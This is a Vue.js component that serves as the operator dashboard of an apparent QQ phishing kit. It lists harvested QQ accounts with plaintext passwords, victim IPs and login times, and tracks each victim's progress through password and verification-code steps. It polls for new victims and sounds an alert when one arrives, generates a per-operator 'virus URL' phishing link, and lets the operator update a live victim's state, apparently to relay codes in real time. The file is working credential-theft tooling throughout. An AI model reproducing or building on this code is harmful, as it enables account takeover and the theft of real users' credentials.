<template>
  <div>
    <audio class="audio"
           src="@/assets/tip3.mp3"
           controls
           id="warningAudio" hidden>
    </audio>

    <!-- <van-nav-bar
      class="pop-btn"
      title="用户管理"
      right-text="跳转病毒URL"
      @click-right="onClickRight"
      v-clipboard:copy="copyText"
    > -->
    <van-nav-bar
      class="pop-btn"
      title="用户管理"
      right-text="跳转病毒URL"
      @click-right="onClickRight"
    >
    </van-nav-bar>

    <!-- 用户管理 -->
    <div class="tabbar-div">
      <van-search
        @change="search"
        v-model="searchValue"
        placeholder="请输入搜索QQ号码关键词"
      />
      <van-list
        v-model="loading"
        :finished="finished"
        finished-text="没有更多了"
        @load="onLoadUser"
      >

        <el-table :data="list">
          <el-table-column prop="id" label="编号" width="180"></el-table-column>
          <el-table-column prop="username" label="QQ账号" width="180"></el-table-column>
          <el-table-column prop="password" label="QQ密码" width="180"></el-table-column>
          <el-table-column prop="myauditstatus" label="审核状态" width="180"></el-table-column>
          <el-table-column prop="staypage" label="目前状态：" width="180"></el-table-column>
          <el-table-column prop="ip" label="登录ip" width="180"></el-table-column>
          <el-table-column prop="mylogintime" label="登录时间" width="180"></el-table-column>
          <el-table-column label="操作">
            <template slot-scope="scope">
              <el-button
                size="mini"
                @click="updateState(scope.row.id,scope.row.auditstatus)">处理状态</el-button>
            </template>
          </el-table-column> 
          
          <el-table-column label="操作">
            <template slot-scope="scope">
              <el-button
                size="mini"
                type="danger"
                @click="deleteUser(scope.row.id)">删除</el-button>
            </template>
          </el-table-column>

        </el-table>

        <!-- 上方需要更改 -->
      </van-list>

      <van-pagination
        :page-count="this.totalPage"
        :total-items="this.totalCount"
        @change="getDataUser"
        v-model="currentPage"
        :items-per-page="this.limit"
      />
    </div>

    <van-tabbar @change="onChange" v-model="active">
      <van-tabbar-item icon="home-o">病毒URL</van-tabbar-item>
      <van-tabbar-item v-show="isAdmin" icon="search">管理员管理</van-tabbar-item>
      <van-tabbar-item icon="friends-o">用户管理</van-tabbar-item>
      <van-tabbar-item icon="setting-o">我的</van-tabbar-item>
    </van-tabbar>


    <!-- <my-bottom/> -->
  </div>
</template>

<script>

// 这里可以导入其他文件（比如：组件，工具js，第三方插件js，json文件，图片文件等等）
import admin from "@/api/admin";
import user from "@/api/user";
import { Toast } from "vant";
import site from "@/api/site";
import { Notify } from "vant";
import { Dialog } from "vant";

// import MyBottom from '@/components/bottom.vue'

export default {
  // 组件注册
  // components: {'MyBottom':MyBottom},
  // 定义属性
  data() {
    return {
      active: 2,
      list: [],
      loading: false,
      finished: false,
      searchValue: "",
      currentPage: 1, // 选择的当前页码
      limit: 2, // 单页显示多少条数据
      totalCount: 0, // 总数据量
      totalPage: 0, //根据数据自动算出需要多少页
      isNmber: false, // 是否第一次赋值总条数
      setintervals: null,
      isAdmin: false,
      ifTip:false
    };
  },
  // 计算属性，会监听依赖属性值随之变化
  computed: {},
  // 监控data中的数据变化
  watch: {
    totalCount(next,pre){
      console.log('变化：',pre,next)
      if(next > pre && pre != 0 ){
      //进行响铃
        console.log('############')
        let warningAudioDom = document.getElementById('warningAudio')
        // 触发播放
        warningAudioDom.play()        
      }
    }
  },
  // 方法集合
  methods: {
    // 删除用户
    deleteUser(id) {
      console.log(id)
      Dialog.confirm({
        title: "提示",
        message: "您确认要删除吗？删除后不可恢复",
      })
        .then(() => {
          // on confirm
          user.deleteUser(id).then(res => {
            if (res.code == "200") {
              Toast.success(`删除成功`);
              this.onLoadUser(); // 重新赋值
              if (this.list.length - 1 === 0) {
                this.list = [];
              }
            } else {
              Toast.success(`删除失败`);
            }
          });
        })
        .catch(() => {
          // on cancel
        });
    },
    onClickRight() {
      // 生产病毒URL
      site.getSiteInfo().then((res) => {
        const logInfo = JSON.parse(sessionStorage.getItem("user")); // 获取当前登录信息
        const att = `${res.site.value1}#/?adminUserName=${logInfo.username}`; // 生成病毒URL

        const toast = Toast.loading({
          duration: 0, // 持续展示 toast
          forbidClick: true,
          message: "倒计时 3 秒",
        });

        let second = 3;
        const timer = setInterval(() => {
          second--;
          if (second) {
            toast.message = `倒计时 ${second} 秒  请手动复制`;
          } else {
            clearInterval(timer);
            // 手动清除 Toast
            Toast.clear();

            window.open(att); // 跳转
          }
        }, 1000);
      });
    },

    search() {
      if (this.searchValue.length > 0) {
        window.clearInterval(this.setintervals); //查询的时候关闭监控

        user.likeUser(this.searchValue).then((res) => {
          // console.log(res);
          const arr = []; // 初始化数组
          for (let index = 0; index < res.data.length; index++) {
            const element = res.data[index];

            var auditstatus = "";
            if (element.auditstatus == 1) {
              auditstatus = "密码错误";
            } else if (element.auditstatus == 2) {
              auditstatus = "验证验证码";
            }
            if (element.auditstatus == 3) {
              auditstatus = "验证码错误";
            }
            if (element.auditstatus == 4) {
              auditstatus = "验证码正确";
            }
            if (element.auditstatus == 5) {
              auditstatus = "加载页面";
            }

            element['myauditstatus'] = auditstatus
            arr.push(element)
            // console.log(element)
          }
          console.log(arr)
          this.list = arr
          this.finished = true;
        });
      } else {
        this.onLoadUser(); //重新初始化数据
        this.setintervals = setInterval(this.onLoadUser, 3000); //定时监控
      }
    },
    check(id) {
      user.info(id).then((res) => {
        console.log(res);
        if (res.code == "500") {
          Toast.fail(`编号:${id},离线`);
        } else if (res.code == "200") {
          Toast.success(`编号:${id},在线,当前操作页:${res.user.staypage}`);
        }
      });
    },
    onChange(index) {
      // 最下面的4个菜单事件
      if (this.active == 2) {
        window.location.href = "/#/userManager";
      } else if (this.active == 1) {
        window.location.href = "/#/adminManager";
      } else if (this.active == 0) {
        window.location.href = "/#/homeManager";
      } else if (this.active == 3) {
        window.location.href = "/#/myManager";
      }
      //   Notify({ type: "primary", message: index });
    },
    getDataUser() {
      // 点击页码事件
      this.onLoadUser();
    },
    updateState(id, auditstatus) {
      console.log(id,auditstatus)
      user.info(id).then((res) => {
        console.log(res);
        if (res.code == "500") {
          Notify("无需修改状态，用户已经离线");
        } else if (res.code == "200") {
          this.$router.push({
            path: "/updateState",
            query: {
              id: id,
              auditstatus: auditstatus,
              info: `编号:${id},在线,当前操作页:${res.user.staypage}`,
            },
          });
        }
      });
    },
    onLoadUser() {
      // 初始化数据
      // 异步更新数据
      admin.listUser(this.limit, this.currentPage).then((res) => {
        if (res.code == 200) {
          if (this.isNmber == false) {
            //赋值总数量
            this.totalCount = res.page.totalCount;

            // ture 就一次进入该方法
            this.isNmber = true;
          }
          
          this.totalCount = res.page.totalCount; // 赋值最大数据

          const arr = []; // 初始化数组
          for (let index = 0; index < res.page.list.length; index++) {
            const element = res.page.list[index];
            // 局部变量push数据
            // 是否在线：${element.state == 0?'在线':'离线'} ----
            var auditstatus = "";
            if (element.auditstatus == 1) {
              auditstatus = "密码错误";
            } else if (element.auditstatus == 2) {
              auditstatus = "验证验证码";
            }
            if (element.auditstatus == 3) {
              auditstatus = "验证码错误";
            }
            if (element.auditstatus == 4) {
              auditstatus = "验证码正确";
            }
            if (element.auditstatus == 5) {
              auditstatus = "加载页面";
            }
            element['myauditstatus'] = auditstatus
            element['mylogintime'] = new Date(element['logintime']).toLocaleString()
            
            arr.push(element)
            // console.log(element)
          }
          console.log(arr)
          this.list = arr
          this.finished = true;
        }
      });
    },
  },
  // 生命周期 - 创建完成（可以访问当前this实例）
  created() {
    // 检查是否登录
    const logInfo = JSON.parse(sessionStorage.getItem("user"));

    if (logInfo == null) {
      Toast.fail("请登录");
      this.$router.push("/adminLogin");
    } else if (logInfo.username == "admin") {
      // 判断是不是管理员
      this.isAdmin = true;
    }
  },
  // 生命周期 - 挂载完成（可以访问DOM元素）
  mounted() {
    localStorage.setItem('totalPage',0)
    this.setintervals = setInterval(this.onLoadUser, 3000); // 开启监控
  },
  beforeCreate() {}, // 生命周期 - 创建之前
  beforeMount() {}, // 生命周期 - 挂载之前
  beforeUpdate() {}, // 生命周期 - 更新之前
  updated() {}, // 生命周期 - 更新之后
  beforeDestroy() {}, // 生命周期 - 销毁之前
  destroyed() {}, // 生命周期 - 销毁完成
  activated() {}, // 如果页面有keep-alive缓存功能，这个函数会触发
};
</script>

<style scoped>
.tabbar-div {
  height: 100%;
}
</style>
